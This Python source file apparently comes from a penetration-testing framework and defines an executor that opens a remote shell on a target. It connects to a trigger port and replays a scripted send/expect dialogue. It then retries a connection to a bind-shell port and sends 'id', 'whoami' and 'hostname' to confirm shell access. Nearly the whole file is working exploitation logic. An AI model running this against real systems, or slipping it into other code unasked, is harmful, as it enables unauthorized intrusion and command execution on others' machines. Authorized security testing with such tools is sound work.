import logging
import re
import socket
import time
from typing import Any, Dict, List

logger = logging.getLogger("kali-engine.executor.trigger_bind_shell")


class TriggerBindShellExecutor:
    def __init__(
        self,
        host: str,
        trigger_protocol: str,
        trigger_port: int,
        dialogue: List[Dict[str, Any]],
        close_channel: bool,
        bind_port: int,
        connect_timeout: float = 2.0,
    ):
        self.host = host
        self.trigger_protocol = trigger_protocol
        self.trigger_port = trigger_port
        self.dialogue = dialogue
        self.close_channel = close_channel
        self.bind_port = bind_port
        self.connect_timeout = connect_timeout

    def _tcp_connect(self, port: int) -> socket.socket:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(self.connect_timeout)
        s.connect((self.host, port))
        return s

    def execute(self) -> Dict[str, Any]:
        try:
            logger.info(
                "[EXECUTOR] trigger_bind_shell: connecting to %s:%s",
                self.host,
                self.trigger_port,
            )

            # Open trigger channel
            sock = self._tcp_connect(self.trigger_port)

            # Execute dialogue
            for step in self.dialogue:
                action = step.get("action")
                data = step.get("data", "")
                encoding = step.get("encoding", "ascii")

                if action == "expect":
                    recv_data = sock.recv(4096)
                    logger.debug("[EXECUTOR] expect: %s", data)

                    if not re.search(data.encode(encoding), recv_data):
                        sock.close()
                        return self._fail(
                            "PRECONDITION_FAILED",
                            "Expected pattern not found in target response",
                        )

                elif action == "send":
                    logger.debug("[EXECUTOR] send: %s", data)
                    sock.sendall(data.encode(encoding) + b"\r\n")

                else:
                    sock.close()
                    return self._fail(
                        "EXECUTOR_ERROR",
                        f"Unsupported dialogue action: {action}",
                    )

            # Close trigger channel if required
            if self.close_channel:
                logger.info("[EXECUTOR] closing trigger channel")
                sock.close()

            # Wait for bind shell to appear
            for attempt in range(1, 11):
                try:
                    logger.info(
                        "[EXECUTOR] attempting bind shell connection %s:%s (attempt %d)",
                        self.host,
                        self.bind_port,
                        attempt,
                    )
                    shell = self._tcp_connect(self.bind_port)
                    return self._success(shell)
                except Exception:
                    time.sleep(0.3)

            return self._fail(
                "TARGET_FAILURE",
                "Bind shell never became available on target",
            )

        except Exception as e:
            logger.exception("[EXECUTOR] trigger_bind_shell failed")
            return self._fail("EXECUTOR_ERROR", str(e))

    def _success(self, shell_socket: socket.socket) -> Dict[str, Any]:
        try:
            probe = self._probe_shell(shell_socket)
        finally:
            shell_socket.close()

        details = (
            f"Bind shell opened on {self.host}:{self.bind_port}. "
            f"User: {probe.get('whoami', '?')}, "
            f"Host: {probe.get('hostname', '?')}"
        )

        return {
            "status": "SUCCESS",
            "details": details,
            "artifact": {
                "bind_port": self.bind_port,
                "socket_open": True,
                "probe": probe,
            },
        }

    def _fail(self, status: str, reason: str) -> Dict[str, Any]:
        return {
            "status": status,
            "details": reason,
        }

    def _probe_shell(self, shell_socket: socket.socket) -> Dict[str, str]:
        """
        Send minimal verification commands to the bind shell.
        Must be non-interactive and bounded.
        """
        probes = ["id", "whoami", "hostname"]
        results = {}

        shell_socket.settimeout(2.0)

        for cmd in probes:
            try:
                shell_socket.sendall(cmd.encode("ascii") + b"\n")
                time.sleep(0.2)
                data = shell_socket.recv(4096)
                results[cmd] = data.decode(errors="ignore").strip()
            except Exception as e:
                results[cmd] = f"<error: {e}>"

        return results
